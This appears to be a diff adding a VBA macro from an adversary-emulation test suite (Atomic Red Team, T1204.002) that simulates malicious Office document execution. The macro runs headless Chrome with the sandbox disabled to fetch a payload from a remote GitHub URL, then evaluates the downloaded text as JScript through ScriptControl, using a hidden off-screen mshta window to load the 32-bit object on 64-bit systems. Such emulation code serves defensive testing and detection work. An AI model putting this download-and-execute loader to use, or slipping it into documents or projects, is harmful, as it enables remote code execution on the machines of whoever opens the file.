@@ -1,0 +1,94 @@
+Private Sub ExecChrome()
+
+    Dim myWS As Object
+    Dim exec As Object
+    Dim url As String
+    
+    url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/payload.txt"
+
+    cmd = findChrome & " --headless "
+    cmd = cmd & "--no-sandbox --enable-logging --disable-gpu "
+    cmd = cmd & "--dump-dom " & url
+    
+    Set myWS = CreateObject("WScript.Shell")
+    Set exec = myWS.exec(cmd)
+    body = exec.StdOut.ReadAll
+    exec.Terminate
+    
+    ' files formatted as .txt and .html
+    prepend = "<html><head></head><body>"
+    prepend2 = "<pre style=""word-wrap: break-word; white-space: pre-wrap;"">"
+    append = "</pre>"
+    append2 = "</body></html>"
+    out = Replace(body, prepend, "")
+    out = Replace(out, prepend2, "")
+    out = Replace(out, append, "")
+    out = Replace(out, append2, "")
+
+    Set oSC = CreateObjectx86("ScriptControl")
+    oSC.Language = "JScript"
+    Result = oSC.Eval("(" + out + ")")
+
+    CreateObjectx86 Empty
+    
+End Sub
+
+Function CreateObjectx86(sProgID)
+
+    Static oWnd As Object
+    Dim bRunning As Boolean
+
+    #If Win64 Then
+        bRunning = InStr(TypeName(oWnd), "HTMLWindow") > 0
+        If IsEmpty(sProgID) Then
+            If bRunning Then oWnd.Close
+            Exit Function
+        End If
+        If Not bRunning Then
+            Set oWnd = CreateWindow()
+            oWnd.execScript "Function CreateObjectx86(sProgID): Set CreateObjectx86 = CreateObject(sProgID): End Function", "VBScript"
+        End If
+        Set CreateObjectx86 = oWnd.CreateObjectx86(sProgID)
+    #Else
+        If Not IsEmpty(sProgID) Then Set CreateObjectx86 = CreateObject(sProgID)
+    #End If
+
+End Function
+
+Function CreateWindow()
+
+    ' source http://forum.script-coding.com/viewtopic.php?pid=75356#p75356
+    Dim sSignature, oShellWnd, oProc
+
+    On Error Resume Next
+    sSignature = Left(CreateObject("Scriptlet.TypeLib").GUID, 38)
+    CreateObject("WScript.Shell").Run "%systemroot%\syswow64\mshta.exe about:""<head><script>moveTo(-32000,-32000);document.title='x86Host'</script><hta:application showintaskbar=no /><object id='shell' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shell.putproperty('" & sSignature & "',document.parentWindow);</script></head>""", 0, False
+    Do
+        For Each oShellWnd In CreateObject("Shell.Application").Windows
+            Set CreateWindow = oShellWnd.GetProperty(sSignature)
+            If Err.Number = 0 Then Exit Function
+            Err.Clear
+        Next
+    Loop
+
+End Function
+
+Function findChrome()
+
+    Dim x86Path As String
+    Dim x64Path As String
+    
+    x64Path = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+    x86Path = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+    
+    If Dir(x86Path) = "" Then
+        If Dir(x64Path) = "" Then
+            MsgBox "Google Chrome is not installed, please install"
+        Else
+            findChrome = x64Path
+        End If
+    Else
+        findChrome = x86Path
+    End If
+
+End Function
